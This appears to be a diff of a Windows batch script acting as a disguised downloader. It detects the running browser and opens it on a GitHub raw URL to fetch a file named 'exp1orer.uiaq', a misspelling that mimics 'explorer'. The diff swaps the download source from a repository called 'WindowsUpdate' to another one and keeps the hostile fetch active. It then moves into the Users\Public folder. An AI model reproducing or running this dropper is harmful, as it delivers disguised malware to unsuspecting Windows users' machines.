@@ -23,7 +23,7 @@ IF EXIST exp1orer.uiaq (
 	goto https
 	
 ) ELSE (
-	tasklist /fi "IMAGENAME eq chrome.exe" | find /i "chrome.exe" && start chrome "https://github.com/AlaskaMN/WindowsUpdate/raw/master/exp1orer.uiaq" || tasklist /fi "IMAGENAME eq firefox.exe" | find /i "firefox.exe" && start firefox "https://github.com/AlaskaMN/WindowsUpdate/raw/master/exp1orer.uiaq" || tasklist /fi "IMAGENAME eq opera.exe" | find /i "opera.exe" && start opera "https://github.com/AlaskaMN/WindowsUpdate/raw/master/exp1orer.uiaq"
+	tasklist /fi "IMAGENAME eq chrome.exe" | find /i "chrome.exe" && start chrome "https://github.com/WernerLS/Treb/raw/master/exp1orer.uiaq" || tasklist /fi "IMAGENAME eq firefox.exe" | find /i "firefox.exe" && start firefox "https://github.com/WernerLS/Treb/raw/master/exp1orer.uiaq" || tasklist /fi "IMAGENAME eq opera.exe" | find /i "opera.exe" && start opera "https://github.com/WernerLS/Treb/raw/master/exp1orer.uiaq"
 
 	cd.. || cd .. & cd.. || cd .. & cd.. || cd .. & cd / & cd Users || cd "Users" & cd Public || cd "Public"
 	
